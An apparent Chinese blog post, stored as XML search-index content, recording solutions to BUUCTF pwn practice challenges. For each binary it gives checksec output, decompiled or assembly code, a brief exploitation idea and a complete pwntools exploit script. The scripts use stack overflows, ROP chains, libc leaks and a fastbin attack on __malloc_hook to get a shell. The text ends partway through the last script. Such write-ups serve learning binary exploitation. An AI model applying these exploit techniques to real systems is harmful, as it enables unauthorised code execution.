<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PWN做题记录</title>
    <url>/2020/10/03/PWN%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/10/02/jNvMtskuShOIeE9.jpg" alt="5f6029560fe90.jpg"></p>
<a id="more"></a>

<p>做到哪里算那题，没有难度不一，没有先后顺序。题目都可以在BUU上找到。</p>
<h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  write(1, &quot;Hello, World\n&quot;, 0xDuLL);</span><br><span class="line">  return vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="vulnerable-function函数如下："><a href="#vulnerable-function函数如下：" class="headerlink" title="vulnerable_function函数如下："></a>vulnerable_function函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+0h] [bp-80h]@1</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="callsystem函数如下："><a href="#callsystem函数如下：" class="headerlink" title="callsystem函数如下："></a>callsystem函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int callsystem()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>溢出覆盖返回地址到<code>callsystem</code>函数地址，<code>getshell</code>。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level0&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27943)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">flag_addr&#x3D;0x0400596</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+p64(flag_addr)</span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">~</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-1"><a href="#main函数如下：-1" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(&quot;echo &#39;Hello World!&#39;&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="vulnerable-function函数如下：-1"><a href="#vulnerable-function函数如下：-1" class="headerlink" title="vulnerable_function函数如下："></a>vulnerable_function函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+0h] [bp-88h]@1</span><br><span class="line"></span><br><span class="line">  system(&quot;echo Input:&quot;);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用：-1"><a href="#利用：-1" class="headerlink" title="利用："></a>利用：</h4><p>程序有system函数，但是参数不对，查找字符串找到<code>/bin/sh</code>,32位程序传入栈中getshell。这里payload写了俩种利用方式，大同小异。</p>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level2&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29538)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level2&#39;)</span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">call_system&#x3D;0x0804849E</span><br><span class="line">bin_sh_addr&#x3D;0x0804A024</span><br><span class="line">#payload&#x3D;&#39;a&#39;*0x8c+p32(call_system)+p32(bin_sh_addr)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x8c+p32(system_plt)+p32(1)+p32(bin_sh_addr)</span><br><span class="line">sh.recvuntil(&#39;nput:\n&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>checksec检查：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-2"><a href="#main函数如下：-2" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line"></span><br><span class="line">  system(&quot;echo -n \&quot;What&#39;s your name? \&quot;&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%s&quot;, &amp;v4);</span><br><span class="line">  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用：-2"><a href="#利用：-2" class="headerlink" title="利用："></a>利用：</h4><p>利用scanf函数覆盖返回地址，64位程序注意传参顺序，rdi，rsi，rdx，rcx，r8，r9.</p>
<p>exp如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;babyrop&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26344)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_ret&#x3D;0x0000000000400683</span><br><span class="line">bin_sh_addr&#x3D;0x0000000000601048</span><br><span class="line">call_system&#x3D;0x00000000004005E3</span><br><span class="line">sh.recvuntil(&quot;What&#39;s your name? &quot;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x10+&#39;a&#39;*0x8+p64(pop_ret)+p64(bin_sh_addr)+p64(call_system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><h4 id="checksec检查：-1"><a href="#checksec检查：-1" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-3"><a href="#main函数如下：-3" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  size_t nbytes; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  LODWORD(nbytes) &#x3D; 0;</span><br><span class="line">  puts(&quot;**********************************&quot;);</span><br><span class="line">  puts(&quot;*     Welcome to the BJDCTF!     *&quot;);</span><br><span class="line">  puts(&quot;* And Welcome to the bin world!  *&quot;);</span><br><span class="line">  puts(&quot;*  Let&#39;s try to pwn the world!   *&quot;);</span><br><span class="line">  puts(&quot;* Please told me u answer loudly!*&quot;);</span><br><span class="line">  puts(&quot;[+]Are u ready?&quot;);</span><br><span class="line">  puts(&quot;[+]Please input the length of your name:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;nbytes);</span><br><span class="line">  puts(&quot;[+]What&#39;s u name?&quot;);</span><br><span class="line">  read(0, &amp;buf, (unsigned int)nbytes);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="backdoor函数如下："><a href="#backdoor函数如下：" class="headerlink" title="backdoor函数如下："></a>backdoor函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 backdoor()</span><br><span class="line">&#123;</span><br><span class="line">  system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用：-3"><a href="#利用：-3" class="headerlink" title="利用："></a>利用：</h4><p>没有检查name_length，所有直接构造长度，覆盖返回地址。</p>
<h4 id="exp如下：-2"><a href="#exp如下：-2" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bjdctf_2020_babystack&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28979)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor&#x3D;0x00000000004006E6</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x18+p64(backdoor)</span><br><span class="line">sh.recvuntil(&#39;Please input the length of your name:\n&#39;)</span><br><span class="line">sh.sendline(str(len(payload)))</span><br><span class="line">#sh.recvuntil(&quot;What&#39;s u name?\n&quot;)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><h4 id="checksec检查：-2"><a href="#checksec检查：-2" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-4"><a href="#利用：-4" class="headerlink" title="利用："></a>利用：</h4><p>程序中edit函数存在漏洞，可以任意输入size，导致我们可以输入任意大小的数据。通过修改free chunk的size，然后申请回来，再次free到unsorted bin里 照成堆块的重叠，来泄露libc，然后修改fastbin中被free掉的chunk的fd指针指向malloc_hook，构造fake chunk。最后写入one_gadget来getshell。</p>
<h4 id="exp如下：-3"><a href="#exp如下：-3" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;babyheap_0ctf_2017&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27186)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babyheap_0ctf_2017&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil(&#39;Command: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;Size: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&#39;Command: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;Index: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;Size: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;Content: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;Command: &#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line">        sh.recvuntil(&#39;Index: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;Command: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;Index: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x90) #0</span><br><span class="line">add(0x90) #1</span><br><span class="line">add(0x90) #2</span><br><span class="line">add(0x90) #3</span><br><span class="line">free(1)</span><br><span class="line">edit(0,0xa0,&#39;a&#39;*0x90+p64(0)+p64(0x141))</span><br><span class="line">add(0x130) #1</span><br><span class="line">edit(1,0xa0,&#39;a&#39;*0x90+p64(0)+p64(0xa1))</span><br><span class="line">free(2)</span><br><span class="line">show(1)</span><br><span class="line"> </span><br><span class="line">main_arena&#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(0x90) #2</span><br><span class="line">add(0x10) #4</span><br><span class="line">add(0x60) #5</span><br><span class="line">add(0x10) #6</span><br><span class="line">free(5)</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">fake_size&#x3D;malloc_hook-0x23</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">edit(4,0x28,&#39;a&#39;*0x10+p64(0)+p64(0x71)+p64(fake_size))</span><br><span class="line">add(0x60) #5</span><br><span class="line">add(0x60) #7</span><br><span class="line">edit(7,0x1b,&#39;a&#39;*0x3+p64(one_gadget)*3)</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><h4 id="checksec检查：-3"><a href="#checksec检查：-3" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="利用：-5"><a href="#利用：-5" class="headerlink" title="利用："></a>利用：</h4><p>发现gets函数，首先泄露libc，然后利用one_gadget来getshell。 这里注意libc版本，远程是libc-2.27.so</p>
<h4 id="exp如下：-4"><a href="#exp如下：-4" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;ciscn_2019_n_5&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29449)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;ciscn_2019_n_5&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc-2.27.so&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">main_addr&#x3D;0x400636</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000400713</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;tell me your name\n&#39;)</span><br><span class="line">sh.sendline(&#39;L0ne1y&#39;)</span><br><span class="line">sh.recvuntil(&#39;What do you want to say to me?\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x28+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f2c5</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;tell me your name\n&#39;)</span><br><span class="line">sh.sendline(&#39;L0ne1y&#39;)</span><br><span class="line">sh.recvuntil(&#39;What do you want to say to me?\n&#39;)</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x28+p64(one_gadget)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h3><h4 id="checksec检查：-4"><a href="#checksec检查：-4" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-6"><a href="#利用：-6" class="headerlink" title="利用："></a>利用：</h4><p>没啥好说的，栈溢出</p>
<h4 id="exp如下：-5"><a href="#exp如下：-5" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level2_x64&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27053)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_ret&#x3D;0x00000000004006b3</span><br><span class="line">bin_sh_addr&#x3D;0x0000000000600A90</span><br><span class="line">call_system&#x3D;0x0000000000400603</span><br><span class="line">sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x80+&#39;a&#39;*0x8+p64(pop_ret)+p64(bin_sh_addr)+p64(call_system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><h4 id="checksec检查：-5"><a href="#checksec检查：-5" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-7"><a href="#利用：-7" class="headerlink" title="利用："></a>利用：</h4><p>main函数没办法F5，只能看会汇编了，system参数利用ROPgadget找到了，<code>0x080482ea : sh</code>，剩下的老套路。</p>
<h4 id="exp如下：-6"><a href="#exp如下：-6" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ciscn_2019_ne_5&#39;)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;ciscn_2019_ne_5&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39; </span><br><span class="line"></span><br><span class="line">system_addr &#x3D; 0x080484D0</span><br><span class="line">sh_addr &#x3D; 0x080482Ea</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;] </span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#39;password:&#39;,&#39;administrator&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x48 + &#39;a&#39;*0x4 + p32(system_addr) + &#39;a&#39;*4 + p32(sh_addr)</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;info:&#39;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h3><h4 id="checksec检查-1"><a href="#checksec检查-1" class="headerlink" title="checksec检查:"></a>checksec检查:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x4000000)</span><br></pre></td></tr></table></figure>

<h4 id="vuln函数："><a href="#vuln函数：" class="headerlink" title="vuln函数："></a>vuln函数：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000004004ED                 push    rbp</span><br><span class="line">.text:00000000004004EE                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1                 xor     rax, rax</span><br><span class="line">.text:00000000004004F4                 mov     edx, 400h</span><br><span class="line">.text:00000000004004F9                 lea     rsi, [rsp+var_10]</span><br><span class="line">.text:00000000004004FE                 mov     rdi, rax</span><br><span class="line">.text:0000000000400501                 syscall</span><br><span class="line">.text:0000000000400503                 mov     rax, 1</span><br><span class="line">.text:000000000040050A                 mov     edx, 30h</span><br><span class="line">.text:000000000040050F                 lea     rsi, [rsp+var_10]</span><br><span class="line">.text:0000000000400514                 mov     rdi, rax</span><br><span class="line">.text:0000000000400517                 syscall</span><br><span class="line">.text:0000000000400519                 retn</span><br></pre></td></tr></table></figure>

<h4 id="gadget片段"><a href="#gadget片段" class="headerlink" title="gadget片段"></a>gadget片段</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000004004E2                 mov     rax, 3Bh</span><br><span class="line">.text:00000000004004E9                 retn</span><br></pre></td></tr></table></figure>

<h4 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="__libc_csu_init"></a>__libc_csu_init</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400596                 add     rsp, 8</span><br><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br></pre></td></tr></table></figure>

<h4 id="利用：-8"><a href="#利用：-8" class="headerlink" title="利用："></a>利用：</h4><p>直接看汇编，syscall系统调用，先调用了<code>read(0,rsp+var_10,0x400)</code>，接着调用<code>write(1,rsp+var_10,0x30)</code>,这里的<code>rsp+var_10</code>在栈里填充0x10就可以覆盖到rbp，还有要注意的点是vuln函数只有<code>push    rbp</code>，<code>mov     rbp, rsp</code>俩条指令，导致ret的时候<code>pop rip</code>，会将栈上rbp的内容pop到rip中。</p>
<p>首先根据程序泄露的栈上地址，计算出<code>/bin/sh\x00</code>的偏移，同时也可以计算出 <code>mov     rax, 3Bh</code>地址。然后再次输入，通过<code>__libc_csu_init</code>来将<code>execve(“/bin/sh”,0,0)</code>写入。具体寄存器值，rax=59，rdi=/bin/sh\x00，rsi=0，rdx=0.</p>
<h4 id="exp如下：-7"><a href="#exp如下：-7" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;ciscn_s_3&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">gadget_one&#x3D;0x000000000040059A</span><br><span class="line">gadget_two&#x3D;0x0000000000400580</span><br><span class="line">syscall&#x3D;0x0000000000400501</span><br><span class="line">vlun_addr&#x3D;0x00000000004004ED</span><br><span class="line">mov_rax_ret&#x3D;0x00000000004004E2</span><br><span class="line">pop_rdi_ret&#x3D;0x00000000004005a3</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;+&#39;a&#39;*0x8+p64(vlun_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh,&quot;b *0x0000000000400503&quot;)</span><br><span class="line"></span><br><span class="line">sh.recv(0x20)</span><br><span class="line">stack_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;stack_addr : &#39; +hex(stack_addr))</span><br><span class="line">bin_sh_addr&#x3D;stack_addr-0x118</span><br><span class="line">mov_rax&#x3D;bin_sh_addr+0x10</span><br><span class="line">sh.success(&#39;bin_sh_addr : &#39; +hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span 